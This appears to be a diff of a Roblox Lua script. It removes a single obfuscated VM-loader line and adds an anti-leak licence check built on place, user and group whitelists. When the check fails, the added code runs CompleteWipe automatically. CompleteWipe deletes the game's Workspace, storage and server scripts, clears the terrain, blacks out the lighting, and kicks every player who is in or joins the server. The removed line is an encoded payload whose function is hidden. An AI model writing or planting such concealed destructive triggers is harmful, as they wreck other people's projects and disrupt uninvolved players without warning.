@@ -1,2 +1,136 @@
+-- [[ sys1-0 : 삼중 검증 및 확장 제어 엔진 ]]
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 
-local i=string.byte;local f=string.char;local c=string.sub;local F=table.concat;local s=math.ldexp;local A=getfenv or function()return _ENV end;local L=setmetatable;local h=select;local t=unpack;local r=tonumber;local function E(t)local e,o,n="","",{}local a=256;local d={}for l=0,a-1 do d[l]=f(l)end;local l=1;local function i()local e=r(c(t,l,l),36)l=l+1;local o=r(c(t,l,l+e-1),36)l=l+e;return o end;e=f(i())n[1]=e;while l<#t do local l=i()if d[l]then o=d[l]else o=e..c(e,1,1)end;d[a]=e..c(o,1,1)n[#n+1],e,a=o,o,a+1 end;return table.concat(n)end;local a=E('26C26E27527627525C27622F2761F27622J2761H27A26E26U26E1L27E26M2751027O26E22G27227K21F27226E22U22926U1M1P21727K22U22I2811P21127K26E22M2722821T27X26E22J26U27K1M28B22I25I28221125I27522N26M25226E1S27R28J28S21I28B22G22623Q26E21F22627Y22921Y28221721Y27Y22I26628Q26628T28V26E22C28Z26U28S28M27522M28P1P1M28S26E21V28B29S26E22N29Q26E2A222K24M2961M24M29A29I28329K22U29U28Q29Y2A022U28X28B2A429128B22K25223A29728W27Z24U29D24U27Y2A42AM1S2AO28B21O28B22925Y29D25Y27Y22M25228Q28W29Z27G27622N27I28T27621H27622926M29D27O22U27F27527H2752BW26E2BP27522B27R21227R26K2772C927626D26B27623N24424423T24426D25M27624V23S24023R23U23Z23M25I23S24323V23O2CF25I23T23K25I23R24423L2CW23N23S24224525I24223T25I23Z2422CZ23K24323S23P24223Z23T23S26D26827624224F24623N2D12CA2A62612CC2DT23R23O23U23N26D26I27623L23N24223V2EC23R2422E42E62DR2762552552DG2CF26D27R26E2DJ2DL2DN2DP2E227524623R23Z24424526D2DZ26E27027622A2BS1P22D27R27B2751M27A26M29R2FD2A128B22B26E2AC2FG27522922U2821M2AM22U21Z25I2BC21C29Y22629V1T29Y21Z27229128H21W23Q27K21K29627Z25A29D25A27Y2FY2G02G225Q28F25Q2752G72G927521W2662GD2AG2B92BB2GK2FZ26E2G12752262BA1P1T2BC26E2GS26E21I2GA28K26E21K2852BR2BT2H12462H32G62HG2A22FN28S1P2BQ23Q1P2832HW2492C42752C62752692CB2DS27523Z2EZ2F12F326L27624H2EC24L23Y23Z23U23M2442D826D2F427524V24524N2EK27525223U23R24F2EP2I726E24L23R2EE24423R26D2I527524Y2CF2J623Z2DQ2J926E24I23N2452422CH24F2C92J12F92821827R2HS2A62762FN2BC2FQ26E2FN2FP2JW2HQ2FM27R1M27R26A2CB2K927523L2J42E726N27624X2CI23X2452EZ23P2E72JG2JB2CG2F02DQ2CD27524L2E62D42C92F72752JQ1P22E2JT26E29R2JW2722FP28H2L22K72C32L62JV2C325Q2FP2GQ26E2LC2L52L72C325Y2HN1M2HA2LM2LE2LO2K027Y2LG2K02K42L12FA2LD2LX2LW22B24U2FP2B02LL2M32LN2LZ22E2GH29W2GJ26E22F26M2122A627R28O2FU29Y2AI29W29Y21U29V29X27522F25I29R29Y22B25228L2BH2I12MN2752E927526D2KB26E2KD2EE2EQ27624Q23Z23L23Y2DN23S23L26D2C827524K2442NK2NM23S2JJ2452F526E26D2KG2KV23U23T23P23X24Y23Z2NG26J2IE2O523O2CQ25123Y23R23M23T24124526F26F26D28B2J22KX24424N23U23U2IH2IJ2IL2IN2J124G23T23L24J23S23M2J827624N2CX23Z2D82422IU2J223T2O524425X2IO2762NX24126E25E2JW29K26E1J2PT2L42FU2FD2FI2N826E22I2MC2BZ26U2JY28B22M2Q42A32L92A628H21U2QA21V25I28W2MX26E21Y2QA21Z25Q2AA2LK2222QA2232LQ2A62HA2262QA2272662AM1M2PT22B2GW2A62PW2AY2892MA22I2BF1P1U2BH2BL2FF27E2FL2MY2FO2LZ2292MW28S22U2222MG2112MI2241U26X26E2141U1P2I02LK21L2LK2232M12BI27521M27I2HT2BQ2122HX2172SF2492MF28Q2MI2Q32821X2FK28L28B2SK2892SM2881X28B22F2S82N72I326E2ID2NB2ND2NF2KF2KH2KJ2KL23R2KN26D26V27625023N2462CR23P2EG23N23M2512DD2J62EB26D2OC2752512CF2402CF2TP2CI23R2TS2NR26E2TP2D42DH24424H24323Z26D2T42U52EH2442U82522TC23X2EX26E2JB2J42F326T2762TW2442TY24425123P2NU2462422UT24023Z2TD2OR25525224N25024L24J24Q25524523R23K23N24V2U82PG2I92F02F22UM2462TL2OW26E2ER22A2A61P1X2F82FA1K27R2L22SP27522E288122SY26M2JY28Z2762JZ2SZ2SR2C32K627R2IP2O12V62V82VA2VC2VE2VG2VI2VK2ND2EH2452UL2KU26E2TB24123S');local n=bit and bit.bxor or function(l,e)local o,n=1,0 while l>0 and e>0 do local a,c=l%2,e%2 if a~=c then n=n+o end l,e,o=(l-a)/2,(e-c)/2,o*2 end if l<e then l=e end while l>0 do local e=l%2 if e>0 then n=n+o end l,o=(l-e)/2,o*2 end return n end local function l(o,l,e)if e then local l=(o/2^(l-1))%2^((e-1)-(l-1)+1);return l-l%1;else local l=2^(l-1);return(o%(l+l)>=l)and 1 or 0;end;end;local e=1;local function o()local o,l,c,a=i(a,e,e+3);o=n(o,230)l=n(l,230)c=n(c,230)a=n(a,230)e=e+4;return(a*16777216)+(c*65536)+(l*256)+o;end;local function d()local l=n(i(a,e,e),230);e=e+1;return l;end;local function E()local e=o();local o=o();local c=1;local n=(l(o,1,20)*(2^32))+e;local e=l(o,21,31);local l=((-1)^l(o,32));if(e==0)then if(n==0)then return l*0;else e=1;c=0;end;elseif(e==2047)then return(n==0)and(l*(1/0))or(l*(0/0));end;return s(l,e-1023)*(c+(n/(2^52)));end;local s=o;local function r(l)local o;if(not l)then l=s();if(l==0)then return'';end;end;o=c(a,e,e+l-1);e=e+l;local e={}for l=1,#o do e[l]=f(n(i(c(o,l,l)),230))end return F(e);end;local e=o;local function i(...)return{...},h('#',...)end local function B()local f={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};local e={0,0,0};local c={};local a={f,nil,e,nil,c};for l=1,o()do e[l-1]=B();end;a[4]=d();for a=1,o()do local c=n(o(),181);local o=n(o(),240);local n=l(c,1,2);local e=l(o,1,11);local e={e,l(c,3,11),nil,nil,o};if(n==0)then e[3]=l(c,12,20);e[5]=l(c,21,29);elseif(n==1)then e[3]=l(o,12,33);elseif(n==2)then e[3]=l(o,12,32)-1048575;elseif(n==3)then e[3]=l(o,12,32)-1048575;e[5]=l(c,21,29);end;f[a]=e;end;local l=o()local o={0,0,0,0,0,0,0,0,0,0,0,0};for n=1,l do local e=d();local l;if(e==1)then l=(d()~=0);elseif(e==0)then l=E();elseif(e==3)then l=r();end;o[n]=l;end;a[2]=o return a;end;local function s(l,E,f)local o=l[1];local n=l[2];local e=l[3];local l=l[4];return function(...)local a=o;local n=n;local u=e;local c=l;local F=i local e=1;local d=-1;local D={};local r={...};local i=h('#',...)-1;local h={};local o={};for l=0,i do if(l>=c)then D[l-c]=r[l+1];else o[l]=r[l+1];end;end;local M=i-c+1 local l;local c;while true do l=a[e];c=l[1];if c<=33 then if c<=16 then if c<=7 then if c<=3 then if c<=1 then if c==0 then local e=l[2];local c={};local n=0;local l=e+l[3]-1;for l=e+1,l do n=n+1;c[n]=o[l];end;o[e](t(c,1,l-e));d=e;else local e=l[2];local n=(l[5]-1)*50;local c=o[e];local l=d-e;for l=1,l do c[n+l]=o[e+l]end;end;elseif c>2 then local l=l[2];local n=o[l];local e=d-l;for e=1,e do n[e]=o[l+e]end;else f[n[l[3]]]=o[l[2]];end;elseif c<=5 then if c==4 then local e=l[2];local c=o[l[3]];o[e+1]=c;o[e]=c[n[l[5]]];else local t;local d;local c;o[l[2]]={unpack({},1,l[3])};e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];c=l[2];d=o[c];t=l[3];for l=1,t do d[l]=o[c+l]end;end;elseif c==6 then o[l[2]]=n[l[3]];else local l=l[2];d=l+M-1;for e=l,d do local l=D[e-l];o[e]=l;end;end;elseif c<=11 then if c<=9 then if c>8 then o[l[2]]=E[l[3]];else local c;local s,c;local i;local c;local h;local r;o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]];e=e+1;l=a[e];r=l[2];h={};c=0;i=r+l[3]-1;for l=r+1,i do c=c+1;h[c]=o[l];end;s,i=F(o[r](t(h,1,i-r)));i=i+r-1;c=0;for l=r,i do c=c+1;o[l]=s[c];end;d=i;e=e+1;l=a[e];r=l[2];h={};c=0;i=d;for l=r+1,i do c=c+1;h[c]=o[l];end;s={o[r](t(h,1,i-r))};i=r+l[5]-2;c=0;for l=r,i do c=c+1;o[l]=s[c];end;d=i;e=e+1;l=a[e];e=e+l[3];end;elseif c>10 then o[l[2]]=n[l[3]];else o[l[2]]=o[l[3]][n[l[5]]];end;elseif c<=13 then if c==12 then e=e+l[3];else local n=l[2];local c=l[5];local l=n+2;local a={o[n](o[n+1],o[l])};for e=1,c do o[l+e]=a[e];end;local n=o[n+3];if n then o[l]=n else e=e+1;end;end;elseif c<=14 then o[l[2]][n[l[3]]]=n[l[5]];elseif c>15 then o[l[2]][n[l[3]]]=o[l[5]];else local n=l[2];local c=l[5];local l=n+2;local a={o[n](o[n+1],o[l])};for e=1,c do o[l+e]=a[e];end;local n=o[n+3];if n then o[l]=n else e=e+1;end;end;elseif c<=24 then if c<=20 then if c<=18 then if c==17 then o[l[2]][n[l[3]]]=o[l[5]];else o[l[2]]={unpack({},1,l[3])};end;elseif c>19 then local r;local i;local h;local c;o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=o[l[3]];e=e+1;l=a[e];c=l[2];h={};i=0;r=c+l[3]-1;for l=c+1,r do i=i+1;h[i]=o[l];end;o[c](t(h,1,r-c));d=c;e=e+1;l=a[e];do return end;else local e=l[2];local c=e+l[3]-2;local n={};local l=0;for e=e,c do l=l+1;n[l]=o[e];end;do return t(n,1,l)end;end;elseif c<=22 then if c>21 then o[l[2]]=#o[l[3]];else local e=l[2];local n=o[e];local l=l[3];for l=1,l do n[l]=o[e+l]end;end;elseif c>23 then local l=l[2];d=l+M-1;for e=l,d do local l=D[e-l];o[e]=l;end;else f[n[l[3]]]=o[l[2]];end;elseif c<=28 then if c<=26 then if c==25 then o[l[2]]={};else local n=l[2];local c={};local e=0;local a=d;for l=n+1,a do e=e+1;c[e]=o[l];end;local c={o[n](t(c,1,a-n))};local l=n+l[5]-2;e=0;for l=n,l do e=e+1;o[l]=c[e];end;d=l;end;elseif c==27 then o[l[2]][n[l[3]]]=n[l[5]];else local e=l[2];local c={};local n=0;local l=e+l[3]-1;for l=e+1,l do n=n+1;c[n]=o[l];end;o[e](t(c,1,l-e));d=e;end;elseif c<=30 then if c>29 then local s;local i;local r;local h;local c;o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];c=l[2];h=o[l[3]];o[c+1]=h;o[c]=h[n[l[5]]];e=e+1;l=a[e];c=l[2];r={};i=0;s=c+l[3]-1;for l=c+1,s do i=i+1;r[i]=o[l];end;o[c](t(r,1,s-c));d=c;e=e+1;l=a[e];do return end;else local l=l[2];local n=o[l];local e=d-l;for e=1,e do n[e]=o[l+e]end;end;elseif c<=31 then local t=u[l[3]];local d;local n={};d=L({},{__index=function(e,l)local l=n[l];return l[1][l[2]];end,__newindex=function(o,l,e)local l=n[l]l[1][l[2]]=e;end;});for c=1,l[5]do e=e+1;local l=a[e];if l[1]==47 then n[c-1]={o,l[3]};else n[c-1]={E,l[3]};end;h[#h+1]=n;end;o[l[2]]=s(t,d,f);elseif c==32 then local n=l[2];local c={};local e=0;local a=n+l[3]-1;for l=n+1,a do e=e+1;c[e]=o[l];end;local c={o[n](t(c,1,a-n))};local l=n+l[5]-2;e=0;for l=n,l do e=e+1;o[l]=c[e];end;d=l;else o[l[2]]=o[l[3]][n[l[5]]];end;elseif c<=50 then if c<=41 then if c<=37 then if c<=35 then if c==34 then o[l[2]]=#o[l[3]];else local n=l[2];local c=d;local e={};local l=0;for n=n,c do l=l+1;e[l]=o[n];end;do return t(e,1,l)end;end;elseif c>36 then if(o[l[2]]==n[l[5]])then e=e+1;else e=e+l[3];end;else o[l[2]]=o[l[3]];end;elseif c<=39 then if c==38 then local e=l[2];local c=o[l[3]];o[e+1]=c;o[e]=c[n[l[5]]];else o[l[2]]=f[n[l[3]]];end;elseif c>40 then local n=l[2];local a={};local e=0;local c=d;for l=n+1,c do e=e+1;a[e]=o[l];end;local c={o[n](t(a,1,c-n))};local l=n+l[5]-2;e=0;for l=n,l do e=e+1;o[l]=c[e];end;d=l;else o[l[2]]={unpack({},1,l[3])};end;elseif c<=45 then if c<=43 then if c>42 then local a=l[2];local n={};for l=1,#h do local l=h[l];for e=0,#l do local e=l[e];local c=e[1];local l=e[2];if c==o and l>=a then n[l]=c[l];e[1]=n;end;end;end;else local n=l[2];local c=n+l[3]-2;local e={};local l=0;for n=n,c do l=l+1;e[l]=o[n];end;do return t(e,1,l)end;end;elseif c>44 then do return end;else local a=l[2];local n={};for l=1,#h do local l=h[l];for e=0,#l do local l=l[e];local c=l[1];local e=l[2];if c==o and e>=a then n[e]=c[e];l[1]=n;end;end;end;end;elseif c<=47 then if c>46 then o[l[2]]=o[l[3]];else if not o[l[2]]then e=e+1;else e=e+l[3];end;end;elseif c<=48 then do return end;elseif c>49 then o[l[2]]={};else local c=l[2];local n=d;local e={};local l=0;for n=c,n do l=l+1;e[l]=o[n];end;do return t(e,1,l)end;end;elseif c<=58 then if c<=54 then if c<=52 then if c==51 then o[l[2]]=f[n[l[3]]];else local n=l[2];local c={};local e=0;local l=n+l[3]-1;for l=n+1,l do e=e+1;c[e]=o[l];end;local c,l=F(o[n](t(c,1,l-n)));l=l+n-1;e=0;for l=n,l do e=e+1;o[l]=c[e];end;d=l;end;elseif c==53 then local n=l[2];local a={};local e=0;local c=n+l[3]-1;for l=n+1,c do e=e+1;a[e]=o[l];end;local c={o[n](t(a,1,c-n))};local l=n+l[5]-2;e=0;for l=n,l do e=e+1;o[l]=c[e];end;d=l;else local l=l[2];local e={};local n=d;for l=l+1,n do e[#e+1]=o[l];end;do return o[l](t(e,1,n-l))end;end;elseif c<=56 then if c==55 then o[l[2]]=s(u[l[3]],nil,f);else local e=l[2];local n=o[e];local l=l[3];for l=1,l do n[l]=o[e+l]end;end;elseif c>57 then o[l[2]]=E[l[3]];else o[l[2]]=s(u[l[3]],nil,f);end;elseif c<=62 then if c<=60 then if c==59 then local n=l[2];local c={};local e=0;local l=n+l[3]-1;for l=n+1,l do e=e+1;c[e]=o[l];end;local c,l=F(o[n](t(c,1,l-n)));l=l+n-1;e=0;for l=n,l do e=e+1;o[l]=c[e];end;d=l;else if(o[l[2]]==n[l[5]])then e=e+1;else e=e+l[3];end;end;elseif c>61 then local t=u[l[3]];local d;local n={};d=L({},{__index=function(e,l)local l=n[l];return l[1][l[2]];end,__newindex=function(o,l,e)local l=n[l]l[1][l[2]]=e;end;});for c=1,l[5]do e=e+1;local l=a[e];if l[1]==47 then n[c-1]={o,l[3]};else n[c-1]={E,l[3]};end;h[#h+1]=n;end;o[l[2]]=s(t,d,f);else e=e+l[3];end;elseif c<=64 then if c==63 then if not o[l[2]]then e=e+1;else e=e+l[3];end;else local E;local r;local i;local h;local s;local c;o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]][n[l[3]]]=n[l[5]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]][n[l[3]]]=n[l[5]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]][n[l[3]]]=n[l[5]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];c=l[2];s=o[l[3]];o[c+1]=s;o[c]=s[n[l[5]]];e=e+1;l=a[e];c=l[2];h={};i=0;r=c+l[3]-1;for l=c+1,r do i=i+1;h[i]=o[l];end;o[c](t(h,1,r-c));d=c;e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]][n[l[3]]]=n[l[5]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];o[l[2]]=n[l[3]];e=e+1;l=a[e];o[l[2]]=n[l[3]];e=e+1;l=a[e];o[l[2]]=n[l[3]];e=e+1;l=a[e];c=l[2];h={};i=0;r=c+l[3]-1;for l=c+1,r do i=i+1;h[i]=o[l];end;E={o[c](t(h,1,r-c))};r=c+l[5]-2;i=0;for l=c,r do i=i+1;o[l]=E[i];end;d=r;e=e+1;l=a[e];o[l[2]][n[l[3]]]=o[l[5]];e=e+1;l=a[e];do return end;end;elseif c<=65 then local e=l[2];local l={};local n=d;for e=e+1,n do l[#l+1]=o[e];end;do return o[e](t(l,1,n-e))end;elseif c>66 then local c;local s,c;local r;local c;local h;local u;local i;o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=E[l[3]];e=e+1;l=a[e];i=l[2];u=o[l[3]];o[i+1]=u;o[i]=u[n[l[5]]];e=e+1;l=a[e];i=l[2];h={};c=0;r=i+l[3]-1;for l=i+1,r do c=c+1;h[c]=o[l];end;s,r=F(o[i](t(h,1,r-i)));r=r+i-1;c=0;for l=i,r do c=c+1;o[l]=s[c];end;d=r;e=e+1;l=a[e];i=l[2];h={};c=0;r=d;for l=i+1,r do c=c+1;h[c]=o[l];end;s={o[i](t(h,1,r-i))};r=i+l[5]-2;c=0;for l=i,r do c=c+1;o[l]=s[c];end;d=r;e=e+1;l=a[e];e=e+l[3];else local s;local r;local c;local h;local i;o[l[2]]=o[l[3]][n[l[5]]];e=e+1;l=a[e];i=l[2];h={};c=0;r=i+l[3]-1;for l=i+1,r do c=c+1;h[c]=o[l];end;s={o[i](t(h,1,r-i))};r=i+l[5]-2;c=0;for l=i,r do c=c+1;o[l]=s[c];end;d=r;e=e+1;l=a[e];o[l[2]]=f[n[l[3]]];e=e+1;l=a[e];o[l[2]]=o[l[3]];e=e+1;l=a[e];i=l[2];h={};c=0;r=i+l[3]-1;for l=i+1,r do c=c+1;h[c]=o[l];end;s={o[i](t(h,1,r-i))};r=i+l[5]-2;c=0;for l=i,r do c=c+1;o[l]=s[c];end;d=r;e=e+1;l=a[e];if(o[l[2]]==n[l[5]])then e=e+1;else e=e+l[3];end;end;e=e+1;end;end;end;return s(B(),{},A())();
+-- 1. 삼중 마스터 화이트리스트 데이터베이스
+local ALLOWED_PLACES = {
+	[123456789] = true, -- 허가된 Place ID
+}
+
+local ALLOWED_USERS = {
+	[11223344] = true,  -- 허가된 User ID
+}
+
+local ALLOWED_GROUPS = {
+	[99887766] = true,  -- 허가된 Group ID
+}
+
+-- 2. 현재 환경 정보 수집
+local currentPlaceId = game.PlaceId
+local currentCreatorId = game.CreatorId
+local currentCreatorType = game.CreatorType
+
+--------------------------------------------------
+game.ReplicatedStorage.data.Value = true
+--------------------------------------------------
+
+
+-- 3. 교차 검증 검사
+local isAuthorized = false
+
+if ALLOWED_PLACES[currentPlaceId] then
+	isAuthorized = true
+	--------------------------------------------------
+	game.ReplicatedStorage.pi.Value = true
+	--------------------------------------------------
+end
+
+if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
+	isAuthorized = true
+	--------------------------------------------------
+	game.ReplicatedStorage.ui.Value = true
+	--------------------------------------------------
+end
+
+if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
+	isAuthorized = true
+	--------------------------------------------------
+	game.ReplicatedStorage.gi.Value = true
+	--------------------------------------------------
+end
+
+
+-- 4. 조건별 실행 분기
+if isAuthorized then
+	-- ==========================================
+	-- [인증 완료] 정상 작동 구간
+	-- ==========================================
+
+	--------------------------------------------------
+	game.ReplicatedStorage.good.Value = true
+	--------------------------------------------------
+
+	--------------------------------------------------
+	-- 님의 핵심 작동 코드를 여기에 배치
+	--------------------------------------------------
+
+else
+	-- ==========================================
+	-- [인증 실패] 비인가 환경 제어 구간
+	-- ==========================================
+
+	--------------------------------------------------
+	game.ReplicatedStorage.ihateu.Value = true
+	--------------------------------------------------
+
+	local function CompleteWipe()
+		-- 1. 데이터 영역 순회 파괴
+		local locations = {
+			game.Workspace,
+			game.ReplicatedStorage,
+			game.ServerStorage,
+			game.StarterGui,
+			game.StarterPack,
+			game.Teams,
+			game.ServerScriptService
+		}
+
+		for _, location in ipairs(locations) do
+			pcall(function()
+				for _, item in ipairs(location:GetChildren()) do
+					-- 시스템 필수 객체 및 유저 제외 후 삭제
+					if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
+						item:Destroy()
+					end
+				end
+			end)
+		end
+
+		-- 2. 지형 초기화
+		pcall(function()
+			game.Workspace.Terrain:Clear()
+		end)
+
+		-- 3. 환경 조명 암전 및 시각 요소 제거
+		pcall(function()
+			game.Lighting.Brightness = 0
+			game.Lighting.ClockTime = 0
+			game.Lighting.GlobalShadows = true
+			game.Lighting:ClearAllChildren()
+			game.Lighting.FogEnd = 0
+			game.Lighting.Ambient = Color3.new(0, 0, 0)
+		end)
+
+		-- 4. 유저 강퇴 처리
+		local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
+		for _, player in pairs(Players:GetPlayers()) do
+			pcall(function() player:Kick(kickMessage) end)
+		end
+		Players.PlayerAdded:Connect(function(player)
+			player:Kick(kickMessage)
+		end)
+	end
+
+	-- 즉시 실행
+	task.spawn(CompleteWipe)
+end
+
+-- ==========================================
+-- 스튜디오 메인 스크립트와 데이터 흐름 맞추기용 리턴
+-- ==========================================
+local SystemResult = {
+	["Status"] = isAuthorized,
+	["Wipe"] = CompleteWipe
+}
+
+return SystemResult
